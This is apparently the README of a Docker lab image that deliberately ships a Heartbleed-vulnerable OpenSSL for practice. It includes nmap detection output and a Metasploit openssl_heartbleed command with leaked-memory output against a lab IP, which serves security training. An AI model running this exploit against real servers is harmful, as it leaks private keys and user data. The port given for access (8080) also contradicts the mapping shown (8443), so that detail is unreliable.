# Vulnerability as a Service - CVE 2014-0160
A Debian (Wheezy) Linux system with a vulnerable version of openssl and a web server to showcase CVS-2014-0160, a.k.a. Heartbleed

# Overview
This docker container is based on Debian Wheezy and has been modified to use a vulernable version of OpenSSL (openssl_1.0.1e-2).

A simple static web page is served via Apache 2.

# Usage
Install the container with</br>
`docker pull hmlio/vaas-cve-2014-0160`

Run the container with a port mapping</br>
`docker run -d -p 8443:443 hmlio/vaas-cve-2014-0160`

You should be able to access the web application at http://your-ip:8080/.

# Checking
The web server/vulnerrable openssl version can be verified and exploited as shown below (using a Kali machine is recommended):</br>

root@kali:/tmp# nmap -sV -p 8443 --script=ssl-heartbleed your-ip

Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-12 22:07 CEST
Nmap scan report for vulny (your-ip)
Host is up (0.00016s latency).
PORT    STATE SERVICE  VERSION
8443/tcp open  ssl/http Apache httpd 2.2.22 ((Debian))
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|     Description:
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds

# Exploitation
Using msfcli from the Metasploit framework:
root@kali:/tmp# msfcli auxiliary/scanner/ssl/openssl_heartbleed RHOSTS=192.168.179.230 RPORT=8443 VERBOSE=true E

...
...
[*] 192.168.179.230:8443 - Sending Heartbeat...
[*] 192.168.179.230:8443 - Heartbeat response, 65535 bytes
[+] 192.168.179.230:8443 - Heartbeat response with leak
[*] 192.168.179.230:8443 - Printable info leaked: U`tcz~8}"V2|vf3<tf"!98532ED/A/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: de,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip

